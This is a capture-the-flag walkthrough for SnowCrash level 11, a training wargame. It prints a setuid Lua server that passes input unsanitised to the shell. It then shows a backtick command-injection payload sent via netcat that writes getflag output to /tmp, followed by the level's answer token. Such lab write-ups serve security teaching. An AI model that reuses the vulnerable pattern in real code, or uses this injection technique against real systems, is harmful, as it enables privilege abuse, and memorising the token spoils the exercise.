# 🚩 SnowCrash — Level11

## 🎯 Goal

Find the password for **flag11**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```

A setuid Lua script.

---

## 2. Analyze the Lua script

```bash
cat level11.lua
```

**Content:**

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```

**Analysis:**
- The script runs a server on port **5151**
- It receives a password and hashes it using SHA1
- **Critical vulnerability:** In the `hash()` function, the password is directly concatenated into a shell command:
  ```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  ```
- No input sanitization - we can inject arbitrary commands!

---

## 3. Exploit via command injection

The password input is directly inserted into a shell command. We can use backticks for command substitution.

Connect to the server:

```bash
nc localhost 5151
```

When prompted for password, inject a command with output redirection:

```
`getflag > /tmp/flag11`
```

**Why redirect to a file?**
- The script only reads the output of the command (for hashing)
- It doesn't send command output back to the client
- We need to save the output to a file we can read later

Read the flag:

```bash
cat /tmp/flag11
```

**Output:**

```
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

**How it works:**
1. We send: `` `getflag > /tmp/flag11` ``
2. The script executes: `echo `getflag > /tmp/flag11` | sha1sum`
3. The backticks execute first: `getflag` runs with **flag11** privileges
4. Output is redirected to `/tmp/flag11`
5. We read the file to get the token

---

## ✅ Result

```
fa6v5ateaw21peobuub8ipe6s
```

---

## 🎉 **Final Token for Level11**

```
fa6v5ateaw21peobuub8ipe6s
```
